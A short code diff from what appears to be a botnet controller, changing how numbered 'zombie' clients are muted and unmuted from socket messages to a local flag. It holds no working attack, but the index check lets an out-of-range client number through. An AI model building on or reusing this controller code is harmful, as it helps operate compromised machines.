@@ -94,7 +94,7 @@ void mute(Server* serv, const std::string nb)
 	if (nb_int <= clients.size())
 	{
 		print_status("Muting zombie " + nb + " ...");
-		send(clients[nb_int].sock, "mute", 5, 0);
+		clients[nb_int].mute = 1;
 		print_done("Done");
 	}
 	else
@@ -111,7 +111,8 @@ void unmute(Server* serv, const std::string nb)
 	if (nb_int <= clients.size())
 	{
 		print_status("Unmuting zombie " + nb + " ...");
-		send(clients[nb_int].sock, "unmute", 7, 0);
+		clients[nb_int].mute = 0;
+		print_done("Done");
 	}
 	else
 	{
